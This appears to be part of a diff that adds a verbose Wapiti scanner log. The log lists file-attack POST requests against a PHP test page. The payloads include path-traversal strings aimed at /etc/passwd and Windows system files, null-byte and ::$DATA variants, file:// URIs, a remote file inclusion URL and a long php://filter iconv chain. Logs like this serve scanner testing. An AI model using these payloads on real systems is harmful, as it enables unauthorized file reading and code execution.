+2024-03-20 16:36:02.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.106 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:02.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:02.120 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.139 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.153 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.160 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.169 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.176 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=file%3A%2F%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&security_level=2
+2024-03-20 16:36:02.191 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&security_level=2
+2024-03-20 16:36:02.198 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&security_level=2
+2024-03-20 16:36:02.205 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.211 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.218 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&security_level=2
+2024-03-20 16:36:02.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&security_level=2
+2024-03-20 16:36:02.233 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=commandi_blind.php&security_level=2
+2024-03-20 16:36:02.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=commandi_blind.php%00&security_level=2
+2024-03-20 16:36:02.247 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=commandi_blind.php%3A%3A%24DATA&security_level=2
+2024-03-20 16:36:02.256 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:36:02.263 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:36:02.270 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd
+2024-03-20 16:36:02.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.285 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices
+2024-03-20 16:36:02.292 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=%2Fetc%2Fservices%00
+2024-03-20 16:36:02.298 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:36:02.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:36:02.312 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:36:02.319 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.325 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.333 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:36:02.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:36:02.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:36:02.354 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.361 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.383 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.396 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.404 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.411 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.418 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.432 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.440 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 16:36:02.447 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.468 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.474 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.481 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.488 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.494 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.507 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.526 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.532 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:36:02.539 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.545 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:36:02.553 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:36:02.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:36:02.587 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:36:02.601 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.607 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=2%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:36:02.614 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 16:36:02.621 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/commandi_blind.php (1)
+	data: form_security_level=submit&security_level=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
